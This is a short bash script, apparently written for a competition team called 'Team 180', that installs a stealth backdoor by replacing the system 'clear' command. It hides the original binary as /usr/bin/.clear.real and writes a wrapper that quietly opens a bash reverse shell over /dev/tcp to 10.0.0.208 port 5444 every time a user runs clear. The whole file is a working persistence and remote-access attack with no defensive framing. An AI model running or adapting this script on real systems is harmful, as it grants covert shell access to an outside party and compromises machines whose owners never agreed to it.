
#!/bin/bash

# === Team 180 Reverse Shell Hook for 'clear' ===
# Reverse shell: 10.0.0.208:5444
# Drops a stealth wrapper in /usr/bin/clear
# Preserves original /usr/bin/clear as .clear.real

HOOK_PORT=5444
CALLBACK_IP="10.0.0.208"
REAL_CLEAR="/usr/bin/.clear.real"
WRAPPED_CLEAR="/usr/bin/clear"

echo "[+] Installing stealth 'clear' hook for Team 180..."

# Backup original clear if not already backed up
if [ ! -f "$REAL_CLEAR" ]; then
    echo "[+] Backing up original clear binary..."
    mv "$WRAPPED_CLEAR" "$REAL_CLEAR"
fi

# Write the stealth wrapper
cat <<EOF > "$WRAPPED_CLEAR"
#!/bin/bash
timeout 1 bash -c '/bin/bash -i >& /dev/tcp/$CALLBACK_IP/$HOOK_PORT 0>&1' 2>/dev/null &
$REAL_CLEAR "\$@"
EOF

chmod +x "$WRAPPED_CLEAR"

echo "[+] Hook installed successfully. Listening port: $HOOK_PORT"
